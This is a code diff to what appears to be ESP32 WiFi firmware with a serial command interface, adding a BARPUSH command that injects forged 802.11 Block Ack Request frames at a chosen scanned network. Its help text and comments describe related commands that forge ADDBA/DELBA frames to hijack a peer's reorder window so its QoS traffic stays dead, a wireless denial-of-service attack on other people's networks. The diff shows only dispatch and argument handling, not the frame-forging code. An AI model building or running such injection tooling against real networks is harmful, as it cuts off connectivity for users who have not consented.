@@ -115,6 +115,7 @@ void print_help() {
   Serial.println("INFO BATEST                        dump the forged ADDBA Request / BAR bytes");
   Serial.println("INFO BATX                          send one DELBA/ADDBA/BAR and print the driver verdict");
   Serial.println("INFO BAPLANT <idx> [step]          plant the reorder window once, then stay silent (window-hijack test)");
+  Serial.println("INFO BARPUSH <idx> [step]          send only BARs (no ADDBA/DELBA), then stay silent");
   Serial.println("INFO MON <ch> <secs>               passive capture on one channel (ch=0 hops 1..13)");
   Serial.println("INFO RADIO                         dump the driver's sniffer state (promisc + both filters + channel)");
   Serial.println("INFO CTRLTEST                      inject 10 RTS control frames (can this radio report control frames at all?)");
@@ -640,6 +641,24 @@ void do_ba_test() {
 // BAPLANT <idx> [step]: a few ADDBA frames with an SSN of our choosing, then no
 // more transmission. If the peer's reorder window really moved, its QoS stream
 // stays dead while we are silent.
+void do_bar_push(int index, long step) {
+  if (index < 0 || index >= g_scan_count) {
+    Serial.println("ERR index out of range, run SCAN first");
+    return;
+  }
+  if (step < 0 || step > 2047) {
+    Serial.println("ERR step must be 0..2047 (0..127 = control run)");
+    return;
+  }
+  attack_stop();
+  if (!delba_ba_bar_once(index, (uint16_t)step)) {
+    Serial.println("ERR cannot start the BAR push on that network");
+    return;
+  }
+  Serial.printf("OK BARPUSH %d step=%ld ch=%u\n", index, step, (unsigned)WiFi.channel(index));
+  ui_log("bar push started");
+}
+
 void do_ba_plant(int index, long step) {
   if (index < 0 || index >= g_scan_count) {
     Serial.println("ERR index out of range, run SCAN first");
@@ -1098,6 +1117,15 @@ void dispatch(char* line) {
     do_ba_test();
   } else if (strcmp(command, "BATX") == 0) {
     do_ba_tx();
+  } else if (strcmp(command, "BARPUSH") == 0) {
+    char* idx_token = strtok(nullptr, " \t");
+    char* step_token = strtok(nullptr, " \t");
+    const int push_idx = parse_index(idx_token);
+    if (push_idx < 0) {
+      Serial.println("ERR usage: BARPUSH <idx> [step 0-2047]");
+    } else {
+      do_bar_push(push_idx, step_token ? strtol(step_token, nullptr, 10) : 512);
+    }
   } else if (strcmp(command, "BAPLANT") == 0) {
     char* idx_token = strtok(nullptr, " \t");
     char* step_token = strtok(nullptr, " \t");
